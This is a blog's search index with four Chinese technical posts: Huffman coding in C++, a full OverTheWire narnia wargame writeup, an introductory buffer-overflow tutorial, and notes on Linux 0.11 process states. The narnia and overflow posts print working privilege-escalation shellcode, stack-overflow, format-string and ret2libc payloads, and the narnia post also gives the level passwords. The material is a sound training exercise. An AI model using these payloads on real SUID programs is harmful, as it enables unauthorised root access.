<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[C++优先队列实现哈夫曼编码]]></title>
    <url>%2F2019%2F03%2F02%2FC%2B%2B%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x00 介绍哈夫曼算法 《数据结构与算法分析》给出定义： 算法对一个由树组成的森林进行。一棵树的权等于它的树叶的频率的和。任意选取最小权的两棵树T1和T2，并任意形成以T1和T2为子树的新树，将这样的过程进行C - 1次。在算法的开始，存在C棵单节点树——每个字符一棵。在算法结束时得到一棵树，这棵树就是最优哈夫曼编码树。 哈夫曼编码过程 给出n个字符，对这n个字符进行编码。在这里，我们令n等于5，代表的权值分别为0.1、0.2、0.3、0.4和0.5。根据哈夫曼算法，对其进行哈夫曼编码将按照下列方式依次完成： 5个结点，令其名称即为各自权值： 第一步，合并0.1和0.2： 第二步，合并0.3和0.3： 第三步，合并0.4和0.5： 合并0.6和0.9，得到哈夫曼树： 最后，按照左子树为0，右子树为1的编码规则（也可以是左子树为1，右子树为0）对树进行编码：从而，0.1、0.2、0.3、0.4和0.5的编码分别为010、011、00、10、11哈夫曼编码的应用 文件压缩； HTTP数据包压缩； 信源编码等。 0x01 问题分析 对上述哈夫曼编码过程，我们可以用伪代码描述如下： 1234将n个结点放入集合Swhile (S中的结点数 &gt; 1): 取走S中2个权值最小的结点，计算它们值之和，并加入Sreturn 集合S剩下的结点 # 剩下的结点就是根结点 为了高效求出集合S中2个权值最小的结点，需要借助二叉堆的数据结构（即优先队列），避免实现堆的细节，可以采用C++ STL中的priority_queue。 0x02 代码实现 要求现有input.txt文件，存放内容为0.1、0.2、0.3、0.4和0.5，将各自的哈夫曼编码输出到output.txt中 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;map&gt;#include &lt;fstream&gt;typedef double dataType;typedef struct Node &#123; struct Node* lchild; struct Node* rchild; dataType data;&#125; Huffman;struct cmp &#123; /* 规定优先队列的排序规则 */ bool operator() (Huffman* a, Huffman* b) const &#123; return (a-&gt;data &gt; b-&gt;data); /* 小顶堆 */ &#125;&#125;;/*code 变量的初始值是空字符串，采用二叉树后续遍历，如果是非叶子结点，存在左子树就将code加"0"，存在右子树就将code加"1"，继续递归调用；如果是叶子结点，就记录到键值对（map）里。*/void huffman_code(Huffman* h, std::string code, std::map&lt;double, std::string&gt;&amp; map_huff)&#123; if (!h) return; if (h-&gt;lchild) huffman_code(h-&gt;lchild, code + "0", map_huff); if (h-&gt;rchild) huffman_code(h-&gt;rchild, code + "1", map_huff); if (h-&gt;lchild == 0 &amp;&amp; h-&gt;rchild == 0) &#123; map_huff[h-&gt;data] = code; return; &#125;&#125;void mem_clear(Huffman* p) /* 释放内存 */&#123; if (!p) return; mem_clear(p-&gt;lchild); mem_clear(p-&gt;rchild); delete p;&#125;int main()&#123; std::priority_queue&lt;Huffman*, std::vector&lt;Huffman*&gt;, cmp &gt; Q; std::map&lt;double, std::string&gt; map_huff; std::ifstream fin("input.txt"); std::string code(""); std::ofstream fout("output.txt"); double x; while (fin &gt;&gt; x) &#123; Huffman* h = new Huffman(); h-&gt;data = x; h-&gt;lchild = h-&gt;rchild = 0; Q.push(h); map_huff.insert(&#123;x, ""&#125;); &#125; Huffman* p; while (Q.size() &gt; 1) &#123; /* 如果Q剩余结点大于1，则执行循环体 */ p = new Huffman(); Huffman *p1, *p2; p1 = Q.top(); /* 依次取出权值最小的两个结点，放入p1和p2 */ Q.pop(); p2 = Q.top(); Q.pop(); /* 计算两结点的权值之和，存入p，且因为 p1-&gt;data &lt;= p2-&gt;data，可以将权值小 的结点存入p的左子树，权值大的结点存入p 的右子树，最后将p放入Q中 */ p-&gt;data = p1-&gt;data + p2-&gt;data; p-&gt;lchild = p1; p-&gt;rchild = p2; Q.push(p); &#125; huffman_code(p, code, map_huff); /* p就是哈夫曼树的根结点 */ mem_clear(p); for (auto&amp; i : map_huff) &#123; fout &lt;&lt; i.first &lt;&lt; "\t" &lt;&lt; i.second &lt;&lt; std::endl; &#125; fin.close(); fout.close(); return 0;&#125; 编译环境g++ -std=c++11 运行结果]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[narnia writeup]]></title>
    <url>%2F2018%2F04%2F23%2Fnarnia-writeup%2F</url>
    <content type="text"><![CDATA[前言 narnia 是 overthewire 上的一个二进制漏洞闯关游戏，总共有9个关卡平台上编译的二进制可执行文件没有开启 ASLR，关闭了 DEP 以及栈保护。该系列在 overthewire 上的难度系数是 2/10。 在通关结尾处作者提到如下作者想保证游戏的体验度，不希望大家把 writeup 公布出来，犹豫了好久，决定还是把解题过程放出来吧，一方面记录自己入坑二进制的过程，另一方面希望能给其他同学一些参考。 level 1: narnia0 -&gt; narnia1source code12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; long val=0x41414141; char buf[20]; printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n"); printf("Here is your chance: "); scanf("%24s",&amp;buf); printf("buf: %s\n",buf); printf("val: 0x%08x\n",val); if(val==0xdeadbeef)&#123; setreuid(geteuid(),geteuid()); system("/bin/sh"); &#125; else &#123; printf("WAY OFF!!!!\n"); exit(1); &#125; return 0;&#125; writeup 根据源码可以知道是要覆盖 val 变量的值，以让 val 等于0xdeadbeef。但是需要注意一点的是小端序，即要把\xef放到低地址处 从结果看，应当执行成功了，但是没有正常返回 shell，原因是管道输出给程序后，就会自动关闭，导致 shell 无法正常打开 这里修改一下 payload，可以看到成功执行： payload1(python -c 'print "A" * 20 + "\xef\xbe\xad\xde"';cat) | ./narnia0 solution efeidiedae level 2: narnia1 -&gt; narnia2source code12345678910111213141516#include &lt;stdio.h&gt;int main()&#123; int (*ret)(); if(getenv("EGG")==NULL)&#123; printf("Give me something to execute at the env-variable EGG\n"); exit(1); &#125; printf("Trying to execute EGG!\n"); ret = getenv("EGG"); ret(); return 0;&#125; writeup 主程序首先声明一个函数指针ret，它会读取环境变量EGG的值并执行，因此，我们可以在 bash 中将EGG的值设成一个shellcode 我们先用如下一段shellcode： 123456789101112xor %eax,%eaxpush %eaxpush $0x68732f2f ; //shpush $0x6e69622f ; /binmov %esp,%ebxmov %eax,%ecxmov %eax,%edxmov $0xb,%alint $0x80xor %eax,%eaxinc %eaxint $0x80 转换成操作码为： \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 结果如下： 可以看到，只是执行execve(&quot;/bin/sh&quot;)的话仍是 narnia1 用户，不能得到 narnia2 的权限；好在程序设置了 SUID 标志位，参考上一题，我们需要执行setreuid(geteuid(),geteuid());，以让程序根据narnia1执行文件的 SUID 位将进程的 EUID 变为narnia2 修改 shellcode在之前的shellcode基础上加上如下部分 12345678804841c: 31 c0 xor %eax,%eax804841e: b0 c9 mov $0xc9,%al8048420: cd 80 int $0x808048422: 89 c3 mov %eax,%ebx8048424: 89 c1 mov %eax,%ecx8048426: 31 c0 xor %eax,%eax8048428: b0 cb mov $0xcb,%al804842a: cd 80 int $0x80 该部分的作用即为setreuid(geteuid(),geteuid()); 成功执行 payload1export EGG=`python -c 'print "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'` solution nairiepecu level 3: narnia2 -&gt; narnia3source code12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char * argv[])&#123; char buf[128]; if(argc == 1)&#123; printf("Usage: %s argument\n", argv[0]); exit(1); &#125; strcpy(buf,argv[1]); printf("%s", buf); return 0;&#125; writeup 这是段常见的栈溢出代码，只需要让buf溢出并将main函数的返回值覆盖为 shellcode 地址即可，下面需要进行两件事请，一是寻找main函数的返回地址位置相对于buf的偏移量，二是找出写进去的 shellcode 的地址 找函数返回地址相对于buf的偏移量：通过暴力的二分法，我们得到返回地址（也可以借助于msf的测试字符串），buf位置与返回地址的位置相差140个字节。 构造 payload，并找到其地址（我们借用上一题的 shellcode）：随后在gdb中执行x/250x $esp，得到下列结果：找到 shellcode 的地址：0xffffd7d5 最终结果 依然要注意，shellcode 的地址采用小端序payload1./narnia2 `python -c 'print "A" * 80 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 16 + "\xd5\xd7\xff\xff"'` solution vaequeezee level 4: narnia3 -&gt; narnia4source code123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main(int argc, char **argv)&#123; int ifd, ofd; char ofile[16] = "/dev/null"; char ifile[32]; char buf[32]; if(argc != 2)&#123; printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]); exit(-1); &#125; /* open files */ strcpy(ifile, argv[1]); if((ofd = open(ofile,O_RDWR)) &lt; 0 )&#123; printf("error opening %s\n", ofile); exit(-1); &#125; if((ifd = open(ifile, O_RDONLY)) &lt; 0 )&#123; printf("error opening %s\n", ifile); exit(-1); &#125; /* copy from file1 to file2 */ read(ifd, buf, sizeof(buf)-1); write(ofd,buf, sizeof(buf)-1); printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile); /* close 'em */ close(ifd); close(ofd); exit(1);&#125; writeup 一开始看到 strcpy 仍然用之前的方法尝试覆盖，没有成功，因为会把 ofile （以及ifile）覆盖，进入 1234if((ofd = open(ofile,O_RDWR)) &lt; 0 )&#123; printf("error opening %s\n", ofile); exit(-1);&#125; 时会调用exit结束程序 再看一看代码，似乎如果能将 ofile 的值改成其他文件，就会把/etc/narnia_pass/narnia4的内容读到那个文件里，而借助缓冲区溢出的相关原理，我们能很容易的覆盖 ofile 内容 我们创建一个重定向输出文件/tmp/file，并将 file 写权限打开： 1touch /tmp/file;chmod o+rwx /tmp/file 于是，进入/narnia目录，进行如下操作： 实际上，ofile 的值被我们成功赋值为/tmp/file但是 ifile 的值却变成了./././../etc/narnia_pass/narnia4/tmp/file，直接这么做不行，但我们仍要将 ifile 与/etc/narnia_pass/narnia4联系起来 这不，还有软链接嘛 这样，ofile 的值是/tmp/file；ifile 的值是/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file，而它是/etc/narnia_pass/narnia4的软链接 payload12345cd /narnia &amp;&amp; mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ &amp;&amp; \ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file &amp;&amp; \touch /tmp/file &amp;&amp; chmod o+rwx /tmp/file &amp;&amp; \/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file &amp;&amp; \cat /tmp/file solution thaenohtai level 5: narnia4 -&gt; narnia5source code12345678910111213141516171819#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;extern char **environ;int main(int argc,char **argv)&#123; int i; char buffer[256]; for(i = 0; environ[i] != NULL; i++) memset(environ[i], '\0', strlen(environ[i])); if(argc&gt;1) strcpy(buffer,argv[1]); return 0;&#125; writeup 这里可以直接用level 3的方法的：payload1./narnia4 `python -c 'print "A" * 220 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 8 + "\xde\xd7\xff\xff'` solution faimahchiy level 6: narnia5 -&gt; narnia6source code1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main(int argc, char **argv)&#123; int i = 1; char buffer[64]; snprintf(buffer, sizeof buffer, argv[1]); buffer[sizeof (buffer) - 1] = 0; printf("Change i's value from 1 -&gt; 500. "); if(i==500)&#123; printf("GOOD\n"); setreuid(geteuid(),geteuid()); system("/bin/sh"); &#125; printf("No way...let me give you a hint!\n"); printf("buffer : [%s] (%d)\n", buffer, strlen(buffer)); printf ("i = %d (%p)\n", i, &amp;i); return 0;&#125; writeup 提示似乎是在暗示点什么，之前的题都是缓冲区溢出，这里用到了格式化字符串漏洞的利用。通过 12printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));printf ("i = %d (%p)\n", i, &amp;i); 打印i的地址也给了我们，而前面的snprintf函数会造成格式化字符串漏洞 先找格式化字符串距离当前位置的偏移 偏移量是 5 可以向0xffffd62c写数据了 payload1./narnia5 `python -c 'print "\x2c\xd6\xff\xff" + "%.496x%5$n"'` solution neezocaeng level 7: narnia6 -&gt; narnia7source code12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;extern char **environ;// tired of fixing values...// - morlaunsigned long get_sp(void) &#123; __asm__("movl %esp,%eax\n\t" "and $0xff000000, %eax" );&#125;int main(int argc, char *argv[])&#123; char b1[8], b2[8]; int (*fp)(char *)=(int(*)(char *))&amp;puts, i; if(argc!=3)&#123; printf("%s b1 b2\n", argv[0]); exit(-1); &#125; /* clear environ */ for(i=0; environ[i] != NULL; i++) memset(environ[i], '\0', strlen(environ[i])); /* clear argz */ for(i=3; argv[i] != NULL; i++) memset(argv[i], '\0', strlen(argv[i])); strcpy(b1,argv[1]); strcpy(b2,argv[2]); //if(((unsigned long)fp &amp; 0xff000000) == 0xff000000) if(((unsigned long)fp &amp; 0xff000000) == get_sp()) exit(-1); setreuid(geteuid(),geteuid()); fp(b1); exit(1);&#125; writeup 看代码的后面几行，程序正常执行时会在退出前调用fp指向的函数，也就是puts。如果能让fp指向一个我们想要的函数（比如system），再将b1的值换成我们想要的参数（比如/bin/sh），配合着之前的setreuid(geteuid(),geteuid());，我们就能得到narnia7的 shell 了 再看 main 函数前两行 12char b1[8], b2[8];int (*fp)(char *)=(int(*)(char *))&amp;puts, i; 在栈中，b2、b1、fp、i 的地址依次按从低到高的顺序紧密排列，这样，我们借助strcpy就可以先让b1覆盖fp的值，再让b2覆盖b1、fp的值，就像这样： 12strcpy(b1, "AAAAAAAA&lt;system_addr&gt;")strcpy(b2, "AAAAAAAA/bin/sh"); 这样赋值以后，fp的值就变成system函数的地址，b2的值变成/bin/sh，fp(b1)执行的就是system(&quot;/bin/sh&quot;)。所以，找到system函数的地址是本题的关键。 库函数地址的差异实际上是 libc 基址的差异，库函数在libc中的偏移是不变的。在开启了 ASLR 的平台上，每次程序载入时，libc 的基址都会不同（比如：system_addr = libc_start_main_addr - libc_start_main_offset + system_offset）。由于 narnia 平台上关闭了 ASLR，所以只要找到system地址即可。具体过程如下： 泄漏libc_start_main函数地址： 先反汇编main函数，找到printf的地址 设置断点，进入printf函数，查看栈上的内容，在 0060 位置处找到libc_start_main信息： libc_start_main函数地址：0xf7e2f637 - 247 = 0xf7e2f540 在libc-database中查看 libc 的版本 耐心地查看每一个 libc 版本，找到system函数偏移（经检验，本题编译用的是第二个） 计算system地址： system_offset = 0xf7e2f637 - 0x18637 + 0x0003a940 = 0xf7e51940 利用： payload1./narnia6 $(python -c 'print "A" * 8 + "\x40\x19\xe5\xf7"') $(python -c 'print "A" * 8 + "/bin/sh"') solution ahkiaziphu level 8: narnia7 -&gt; narnia8source code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int goodfunction();int hackedfunction();int vuln(const char *format)&#123; char buffer[128]; int (*ptrf)(); memset(buffer, 0, sizeof(buffer)); printf("goodfunction() = %p\n", goodfunction); printf("hackedfunction() = %p\n\n", hackedfunction); ptrf = goodfunction; printf("before : ptrf() = %p (%p)\n", ptrf, &amp;ptrf); printf("I guess you want to come to the hackedfunction...\n"); sleep(2); ptrf = goodfunction; snprintf(buffer, sizeof buffer, format); return ptrf();&#125;int main(int argc, char **argv)&#123; if (argc &lt;= 1)&#123; fprintf(stderr, "Usage: %s &lt;buffer&gt;\n", argv[0]); exit(-1); &#125; exit(vuln(argv[1]));&#125;int goodfunction()&#123; printf("Welcome to the goodfunction, but i said the Hackedfunction..\n"); fflush(stdout); return 0;&#125;int hackedfunction()&#123; printf("Way to go!!!!"); fflush(stdout); setreuid(geteuid(),geteuid()); system("/bin/sh"); return 0;&#125; writeup main函数最后会调用vuln(argv[1])，vuln返回的是ptrf()，看到vuln里的 1snprintf(buffer, sizeof buffer, format); 首先想到利用格式化字符串漏洞覆写ptrf的值，使其指向hackedfunction 不过这里不能确定format距离调用snprintf(buffer, sizeof buffer, format);处的偏移位置。比较暴力的办法就是挨个试。 最终，试出偏移位置是 6 payload1./narnia7 `python -c 'print "\x8c\xd5\xff\xff" + "%134514514x%6$n"'` solution mohthuphog level 9: narnia8 -&gt; narnia9source code123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// gcc's variable reordering fucked things up// to keep the level in its old style i am // making "i" global unti i find a fix // -morla int i; void func(char *b)&#123; char *blah=b; char bok[20]; //int i=0; memset(bok, '\0', sizeof(bok)); for(i=0; blah[i] != '\0'; i++) bok[i]=blah[i]; printf("%s\n",bok);&#125;int main(int argc, char **argv)&#123; if(argc &gt; 1) func(argv[1]); else printf("%s argument\n", argv[0]); return 0;&#125; writeup 在func函数里bok会造成缓冲区溢出，没有其他函数的帮忙，这里需要我们自己写入 shellcode，覆盖func的返回地址。 bok比blah地址低且紧密相连， 12for(i=0; blah[i] != '\0'; i++) bok[i]=blah[i]; 在给bok赋值时，如果argv[1]的长度超过 20，bok就会覆盖blah的值，而blah存放着argv[1]的基地址指针，修改后就不能正确访问我们的输入字符串了。 要想办法找到blah原来的值（即输入字符串的基地址），在输入较长的 payload 时注意把输入字符串的基地址覆盖回去，这样就能将后续的输入内容拷贝到bok中去，进而修改func的返回地址。 先借助反汇编func函数部分，我们在func中的printf处设置断点 由于bok是 20 个字节的缓冲区，我们只需覆盖 20 个字节即可看到 blah 的值即0xffffd5fc处的0xffffd802，它与0xffffd610处的值相同，而这应该就是b所在位置 我们尝试用\x02\xd8\xff\xff覆盖blah发现b和blah的地址不一致，而且由于我们增加了\x02\xd8\xff\xff四个字节，b的地址相对于刚才减少了 4 当我们将地址改成\xfe\xd7\xff\xff又和b的值一致了。经过多次测试我们发现，缓冲区的限制是 20 个字节，计字符串长度为 n+20，则字符串基址将相应地减少 n。比如像这样：0xffffd7ee的地址计算方法为：0xffffd802 - 4 - 12 - 4，这里也很容易看出，func函数的返回地址存放在ABCD所在位置处，因此，我们只需将其改成 shellcode 的地址即可 接下来，我们需要知道程序执行时blah的实际值然后按照上面的步骤，0xffffd80a - 4 - 12 - 4 - 44 = 0xffffd7ca，后面 44 字节是 shellcode 的长度，然后计算 shellcode 的地址0xffffd7ca + 20 + 4 + 12 + 4 = 0xffffd7f2作为第二个 4 字节的值，于是成功构造了pyaload： payload1./narnia8 $(python -c 'print "A" * 20 + "\xca\xd7\xff\xff" + "\x90" * 12 + "\xf2\xd7\xff\xff" + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') solution eiL5fealae 总结 还是太菜了，前后断断续续花了一个多礼拜才写完。对于一些底层基础还是不够扎实，比如 level 7 中的 ret2lib 也是照葫芦画瓢，对程序的装载、链接、空间分配等还是不太了解。 要多读书多实践 :) 参考 通过GOT覆写实现ret2libc - 64-bit Linux stack smashing tutorial: Part 3 CCTF pwn3格式化字符串漏洞详细writeup]]></content>
      <tags>
        <tag>bin shellcode narnia</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探缓冲区溢出]]></title>
    <url>%2F2018%2F04%2F19%2F%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[0x00 前言 缓冲区溢出是一种历史悠久的漏洞，早在 1988 年，由罗伯特,莫里斯(R ob。rtMorris)制造的 Morris 蠕虫，它曾造成全世界6000多台网络服务器瘫痪。 虽然这一漏洞出现时间很久远，现有的防御方法也很有效，但我觉得它依然有很大的研究意义。毕竟攻防没有任何一端会停滞，理解旧的漏洞也是为了更好地理解新的攻击手段，进而更好地完善防御方法。 0x01 环境 ubuntu 16.04.4 LTS x86-64 由于现代操作系统针对缓冲区溢出已经有很完善的防御机制，为方便演示，我们进行如下配置： 关闭 ASLR 在/proc/sys/kernel/randomize_va_space文件中保存有 ASLR 的信息，开启时的值不为 0 我们切换到 root 用户，执行 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 这样就关闭了 ASLR 关闭 NX 和 栈保护（Canary）编译参数：gcc -g -m32 -fno-stack-protector -z execstack 文章最后会具体介绍防御的方法 0x02 具体步骤 首先看一下源代码 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(char *s) &#123; char buf[128]; strcpy(buf, s); printf("%s\n", buf);&#125;int main(int argc, char * argv[]) &#123; vuln(argv[1]); return 0;&#125; 通过 strcpy 函数，我们将argv[1]的值直接拷贝给 buf，如果长度大于其缓冲区的长度，将会发生溢出，只要能正确覆盖 vuln 的返回值，我们就能控制程序流。 编译并将可执行程序的所有者改为 root，并置 SUID 位 对 main 和 vuln 反汇编lea -0x88(%esp), %eax是将 buf 的起始地址赋值给 eax 寄存器，因此，buf 距离 ebp 的偏移是 0x88，payload 总长度再加上 4 字节（覆盖 ebp）和 4 字节（覆盖返回地址）即可。这样，我们可以这样构造 payload：blabla（96 字节） + shellcode（44 字节） + ret_addr（4 字节） 那么shellcode 应该长啥样呢？ 首先要明确两点，一是获取 shell，二是以 root 权限执行，为方便实现后者，我已经在第二步对可执行程序设置了 SUID 位。 对于第一点，我们可以让程序执行execve(&quot;/bin/sh&quot;, 0, 0)这样的语句，在 x86 32 位平台下，该函数执行本质是这样的：三个参数分别保存到 ebx、ecx、edx，进而根据系统调用号（存放在 eax 中），通过int 0x80中断，调用了sys_execve。因此，构造的 shellcode 类似这样： 12345mov "/bin/sh", %ebxmov $0, %ecxmov $0, %edxmov $0xb, %eaxint $0x80 ;调用 execve 对于第二点，我们可以通过setreuid(geteuid(), geteuid())实现，该函数将geteuid()（根据 SUID 位，返回值是 0）得到的值设置为目前进程真实用户识别码，这样，获得的 shell 就是 root 用户的了。为此，shellcode 类似这样： 123456mov $0xc9, %eaxint $0x80 ;调用 geteuid，返回值存于 eaxmov %eax, %ebxmov %eax, %ecxmov $0xcb, %eaxint $0x80 ;调用 setreuid 由于程序编译成 32 位，因此系统调用号可以按下面的方法找： 完整 shellcode 如下： 最后，要确定 shellcode 的地址，由于关闭了 ASLR，所以每次执行程序，shellcode 在地址空间中的位置都是不变的。我们 gdb 调试程序：shellcode 会出现在 0xffffd181 处，所以，payload 最后面四个字节应该是（注意是小端序）：\x81\xd1\xff\xff exp 1./overflow `python -c 'print "A" * 46 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 50 + "\x81\xd1\xff\xff"'` 0x03 防御通过 checksec 看一下可执行程序的防御机制Arch 是运行平台 RELRO RELRO会有 Partial RELRO 和 FULL RELRO，如果开启FULL RELRO，意味着我们无法修改 GOT 表 Stack 要想执行任意代码，需要覆盖函数的返回地址。Canary 机制就是为了防止这一手段，可以把它看成是一个随机值，在被调用函数压入 EBP 前压入栈（即位于返回地址和 EBP 之间），当函数返回时，会先验证这个值是否改变，如果改变了，程序停止执行。这样就防止攻击者覆盖返回地址。当然，如果 Canary 随机值由于某种情况泄漏，依然可以造成攻击。 NX 也称 DEP（数据执行保护），如果启用，地址空间中任何用户可控的地方都会禁止执行，可执行部分也禁止用户写入。常通过 Ret2Lib 以及 ROP 去绕过。 PIE 如果开启了，程序每次运行地址都会变化（比如库函数、变量等，再例如之前的 shellcode 地址就没法通过gdb 调试得到结果，因为每次执行程序 shellcode 的地址都不同）。但仍可通过 libc 基址泄漏、构造 ROP 方式构造攻击向量，甚至在 32 位机器上可以暴力破解。]]></content>
      <tags>
        <tag>bin Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下进程状态的切换]]></title>
    <url>%2F2018%2F03%2F15%2FLinux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E5%88%87%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[前言 我们知道进程是系统进行资源分配和调度的基本单元，在一般的操作系统中，进程至少有如下三种基本状态：就绪态、运行态、阻塞态，它们之间的转化关系为： 除此之外，还可以有新建态和终止态。我们可以从内核代码来深入其转化的细节。 为了讨论起来更加简单，我们用Linux 0.11的部分内核代码来介绍。 由于内核代码相对复杂，这里只关注和进程切换相关的代码，下面来看一下会涉及到的文件 重要概念一些宏定义 进程状态 12345#define TASK_RUNNING 0 // 进程正在运行或已准备就绪#define TASK_INTERRUPTIBLE 1 // 进程处于可中断等待状态#define TASK_UNITERRUPTIBLE 2 // 进程处于不可中断等待状态#define TASK_ZOMBIE 3 // 进程处于僵死状态，已经停止运行，但父进程还没发信号#define TASK_STOPPED 4 // 进程已停止 具体状态转换如下图： ![image](http://ws4.sinaimg.cn/large/a105112bly1g3n5lydlmrj215n0n8tdb.jpg) Linux 0.11支持的任务总数 1#define NR_TASK 64 第一个任务和最后一个任务（遍历任务时会用到）12#define FIRST_TASK task[0]#define LAST_TASK task[NR_TASKS-1] 全局变量 任务结构 123struct task_struct &#123; ...&#125; 存放任务结构的数组 1struct task_struct * task[NR_TASK] = &#123;&amp;(init_task.task), &#125;; 系统调用 分配给一个进程的线性地址空间被分割为用户空间和内核空间，处于用户空间的程序不能想当然地访问其内核空间，当然，硬件在设计上提供给我们一些进入内核的方法，对于 Intel x86 架构下就可以通过int 0x80中断指令，系统调用的接口程序（比如一些库函数）就包含了int 0x80; 实际上，系统在初始化填写 IDT 表时，通过set_system_gate将system_call函数地址和int 0x80捆绑起来。因此，系统调用是在中断0x80发生后，自动调用函数system_call（kernel/system_call.s）。 关键函数 让我们假设一切初始化工作运转良好，操作系统顺利执行了init/main.c的main()函数，内核开始继续进行所有硬件的初始化工作，随后启动任务 0，并通过 1move_to_user_mode(); CPU 从 0 特权级转换为 3 特权级 fork 我感觉最具神秘色彩的一段代码便是下面这几行，就好像上帝前五天创造了光、空气、动物等，完成了环境的初始化工作，在第六天开始，照着自己的模样创造（fork）出了人类（新进程） 123if (!fork()) &#123; init();&#125; 接下来会先调用 fork 程序，我们继续顺着程序流程进入到 fork 里去 在kernel/fork.c文件中，定义了一些函数， 123456789101112extern void write_verify(unsigned long address);void verify_area(void * addr,int size);int copy_mem(int nr,struct task_struct * p);int copy_process(int nr,long ebp,long edi,long esi,long gs,long none, long ebx,long ecx,long edx, long fs,long es,long ds, long eip,long cs,long eflags,long esp,long ss);int find_empty_process(void); 前面我们提到程序特权级变为 3，在运行到 123if (!fork()) &#123; init();&#125; 时进程是用户状态，而fork()程序涉及到内存页面复制等内核级操作，因此，执行fork()实际上是通过int $0x80进入系统调用，进而执行了sys_fork，这一点我们可以在kernel/system_call.s中找到： 123456789101112_sys_fork: call _find_empty_process testl %eax,%eax js 1f push %gs pushl %esi pushl %edi pushl %ebp pushl %eax call _copy_process addl $20,%esp1: ret 可以看出，sys_fork首先调用kernel/fork.c中的find_empty_process函数，该函数旨在遍历任务数组中的任务，生成一个空闲的 pid 并分配给新进程，最后返回分配了新 pid 的任务号到eax中，之后push一堆参数入栈，以调用copy_process。 fork函数最重要的部分想必就是copy_process，而这也是进程状态发生切换的一个地方。 123456789101112131415161718192021int copy_process(int nr,long ebp,long edi,long esi,long gs,long none, long ebx,long ecx,long edx, long fs,long es,long ds, long eip,long cs,long eflags,long esp,long ss)&#123; struct task_struct *p; int i; struct file *f; p = (struct task_struct *) get_free_page(); if (!p) return -EAGAIN; task[nr] = p; *p = *current; /* NOTE! this doesn't copy the supervisor stack */ p-&gt;state = TASK_UNINTERRUPTIBLE; p-&gt;pid = last_pid; p-&gt;father = current-&gt;pid; ... p-&gt;state = TASK_RUNNING; /* do this last, just in case */ return last_pid;&#125; 